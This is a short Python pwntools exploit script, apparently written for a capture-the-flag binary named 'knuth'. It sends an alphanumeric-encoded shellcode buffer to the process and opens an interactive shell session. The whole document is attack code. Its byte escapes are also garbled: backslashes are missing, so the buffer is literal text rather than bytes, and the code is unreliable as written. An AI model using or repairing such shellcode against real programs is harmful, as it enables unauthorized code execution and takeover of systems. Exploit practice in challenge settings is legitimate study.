from pwn import *

r = process('./knuth')

buf =  ""
buf += "x49x49x49x49x49x49x49x49x49x49x49x49x49"
buf += "x49x49x49x49x37x51x5ax6ax41x58x50x30x41"
buf += "x30x41x6bx41x41x51x32x41x42x32x42x42x30"
buf += "x42x42x41x42x58x50x38x41x42x75x4ax49x71"
buf += "x7ax56x6bx32x78x6ax39x71x42x72x46x42x48"
buf += "x64x6dx63x53x6fx79x4ax47x73x58x34x6fx64"
buf += "x33x30x68x33x30x33x58x44x6fx42x42x72x49"
buf += "x30x6ex6fx79x48x63x76x32x38x68x67x73x37"
buf += "x70x67x70x57x70x43x43x63x58x33x30x62x77"
buf += "x76x33x6ex69x4dx31x38x4dx4bx30x41x41"

r.send(buf)
r.interactive()
